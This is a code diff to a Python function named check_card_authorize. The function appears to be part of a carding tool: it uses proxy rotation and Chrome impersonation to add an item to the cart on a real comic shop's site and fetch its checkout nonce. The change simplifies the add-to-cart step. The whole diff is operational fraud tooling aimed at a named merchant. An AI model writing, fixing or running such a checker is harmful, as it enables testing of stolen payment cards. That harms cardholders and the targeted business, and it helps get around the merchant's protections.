@@ -57,46 +57,23 @@ async def check_card_authorize(
     for current_proxies in proxy_attempts:
         try:
             async with AsyncSession(impersonate="chrome120", timeout=30) as session:
-                # Step 1: Add item to cart
-                headers_cart = {
-                    "authority": "backpackcomics.com",
-                    "accept": "*/*",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                    "origin": "https://backpackcomics.com",
-                    "referer": "https://backpackcomics.com/product/large-3-inch-character-buttons-2/?removed_item=1",
-                    "user-agent": user_agent,
-                    "x-requested-with": "XMLHttpRequest",
-                }
-                data_cart = {
-                    "quantity": "1",
-                    "action": "woodmart_ajax_add_to_cart",
-                    "add-to-cart": "11077",
-                }
-                r_add = await session.post(
-                    "https://backpackcomics.com/wp-admin/admin-ajax.php",
-                    headers=headers_cart,
-                    data=data_cart,
-                    proxies=current_proxies,
+                # Step 1: Add item to cart via direct GET param
+                r_add = await session.get(
+                    "https://backpackcomics.com/product/large-3-inch-character-buttons-2/?add-to-cart=11077",
+                    headers={"User-Agent": user_agent},
+                    proxies=current_proxies
                 )
 
-                try:
-                    cart_data = r_add.json()
-                    cart_hash = cart_data.get("cart_hash", "")
-                except Exception:
-                    cart_hash = ""
-
                 # Step 2: Fetch Checkout page to extract nonce
-                cookies = {"woocommerce_cart_hash": cart_hash} if cart_hash else {}
                 headers_checkout = {
                     "authority": "backpackcomics.com",
                     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                    "referer": "https://backpackcomics.com/product/large-3-inch-character-buttons-2/?removed_item=1",
+                    "referer": "https://backpackcomics.com/product/large-3-inch-character-buttons-2/",
                     "user-agent": user_agent,
                 }
                 r_checkout = await session.get(
                     "https://backpackcomics.com/checkout/",
                     headers=headers_checkout,
-                    cookies=cookies,
                     proxies=current_proxies,
                 )
                 html = r_checkout.text
